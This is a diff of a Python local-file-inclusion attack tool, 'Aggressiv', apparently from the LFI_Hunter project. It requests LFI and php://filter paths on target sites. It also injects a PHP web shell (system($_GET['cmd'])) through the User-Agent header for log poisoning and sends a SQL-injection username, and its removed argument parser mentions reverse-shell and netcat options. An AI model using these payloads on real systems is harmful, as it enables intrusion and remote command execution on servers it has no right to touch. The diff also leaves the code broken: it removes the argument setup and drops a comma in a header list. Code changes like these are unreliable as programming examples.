@@ -12,9 +12,9 @@ import subprocess
 ssl._create_default_https_context = ssl._create_unverified_context  
 from Package.one_read import Read_File
 path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
-class Aggressiv :    
-        def __init__(self):            
-            self.control()
+class Aggressiv : 
+
+        def __init__(self,**kwargs):          
             if self.args.readuser:
                  with open(self.args.readuser,'r') as username:
                       self.args.user = username.read().replace('/n','')
@@ -23,7 +23,7 @@ class Aggressiv :
                       self.args.password = password.read().replace('/n','') 
             if self.args.aggress:
                with open(self.args.Cookie,'r') as Cookie_file :
-                      self.Cookie =  Cookie_file.read()
+                      self.args.Cookie =  Cookie_file.read()
             if self.args.Domain:
                self.args.Vulnurl = self.args.Domain
             print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
@@ -37,28 +37,8 @@ class Aggressiv :
             print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
             if self.args.base64:
                print("[+] PHP-Filter          : ................ | : Convert-base64") 
-            print("[+] web Cookies         : ................ | : "+self.Cookie) 
-            if self.args.auth and self.args.Vulnurl\
-            and self.args.password and self.args.user\
-            and self.args.Cookie and self.args.loginurl\
-            and self.args.aggress :
-                self.Login_auth()          
-                self.url_request()
-                self.Scan_result()
-            elif not self.args.auth and self.args.Vulnurl\
-            and not self.args.password and not self.args.user and self.args.Cookie\
-            and self.args.aggress :
-                self.url_request()
-                self.Scan_result()             
-            else:
-                print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
-                print("[*] Error :  Bad argument Logic command  Error" )
-                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
-                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ') 
-                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
-                print("[*] ckeck Readme file at      : https://www.github/jac11/LFI_Hunter.git")
-                exit()                                    
-        def Login_auth(self):
+            print("[+] web Cookies         : ................ | : "+self.args.Cookie) 
+        def Login_auth(self,**kwargs):
           try:
               loginurl = self.args.loginurl
               request = mechanize.Browser()
@@ -66,7 +46,9 @@ class Aggressiv :
               request.set_handle_redirect(True)
               request.set_handle_refresh(True, max_time=1)
               request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                 ('Cookie',str(self.Cookie).replace('\n','')),]
+                                   ('username',f'{self.args.user}'),
+                                   ('password',f'{self.args.password}')
+                                   ('Cookie',str(self.Cookie).replace('\n',''))]
               url_login = request.open(loginurl) 
               try: 
                   request.select_form(nr = 0)
@@ -114,8 +96,9 @@ class Aggressiv :
                 print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                 print("[*] Example : http://10.10.10.193:4000/page=index.php")
                 exit()          
-        def url_request(self): 
+        def url_request(self,**kwargs): 
           try:
+           
             self.box_list    = []  
             self.link_list = []
             if self.args.Domain:
@@ -138,7 +121,7 @@ class Aggressiv :
                     self.LFi = ''
                     if self.args.base64:
                         phpfillter = 'php://filter/read=convert.base64-encode/resource='
-                        URL = self.args.Vulnurl+ phpfillter+LINE
+                        URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                         
                     else:
                          URL = self.args.Vulnurl+LINE
@@ -150,7 +133,7 @@ class Aggressiv :
                     request.set_handle_refresh(True, max_time=1)              
                     request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?>(X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                 ('Cookie',str(self.Cookie).replace('\n','')),
+                                 ('Cookie',str(self.args.Cookie).replace('\n','')),
                                  ('username',"admin'#"),
                                  ('password','password')]
                     try:             
@@ -217,7 +200,7 @@ class Aggressiv :
                        
           except KeyboardInterrupt :
              exit()                                             
-        def Scan_result(self) :
+        def Scan_result(self,**kwargs) :
                  final_list = []
                  remove_dup_elem = [*set(self.box_list)]
                  it = iter(self.link_list)
@@ -256,33 +239,9 @@ class Aggressiv :
                  if  os.path.exists('./Package/.links'):
                      os.remove('./Package/.links')
                      os.remove('./Package/.list')     
-                 print('\n'+'='*40+"\n[*] recmmended links "+'\n'+'='*30+'\n')   
+                 print('\n'+'='*40+"\n[*] Vulnerable Path "+'\n'+'='*30+'\n')   
                  print(readdata)                                           
-        def control(self): 
-           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
-           parser.add_argument("-UV","--Vulnurl"    , action=None         ,required=False      ,help ="url Targst web") 
-           parser.add_argument("--auth"             , action='store_true'                    ,help ="auth mautrd web") 
-           parser.add_argument("-F","--filelist"    , action=None                            ,help ="read fron lfi wordlsit ")
-           parser.add_argument("-C","--Cookie"      , action=None        ,required=True      ,help ="Login sesion Cookie")  
-           parser.add_argument("-B","--base64"      , action='store_true'                    ,help ="decode filter php  base64")  
-           parser.add_argument("-R","--read"        , action=None                            ,help ="use to read file on the traget machine")  
-           parser.add_argument("-UF","--UserForm"   , action=None                            ,help =" add name of the HTML Form Login User")
-           parser.add_argument("-PF","--PassForm"   , action=None                            ,help ="add name of the HTML Form Login Passord")
-           parser.add_argument("-P","--password"    , action=None                            ,help ="use specific Passowrd")   
-           parser.add_argument("-p","--readpass"    , action=None                            ,help ="use specific Passowrd read from file")
-           parser.add_argument("-LU","--loginurl"   , action=None                            ,help =" add login url for auth motted") 
-           parser.add_argument("-U","--user"        , action=None                            ,help ="use specific username ")
-           parser.add_argument("-u","--readuser"    , action=None                            ,help ="use specific username read from file")
-           parser.add_argument("-A","--aggress"     ,action='store_true'                     ,help ="  use aggressiv mode  ")
-           parser.add_argument("--port"             ,action=None                             ,help ="  set port for netcat ")
-           parser.add_argument("-D","--Domain"      ,action=None                             ,help ="  use target url domain not as ip 'http://www.anyDomain.com'")
-           parser.add_argument("-S","--shell"       , action=None                            ,help ="  to connent reverseshell   ")        
-           self.args = parser.parse_args()    
-           if len(sys.argv)!=1 :
-              pass
-           else:
-              parser.print_help()         
-              exit()                   
+          
 if __name__=='__main__':
      Aggressiv()                  
                  
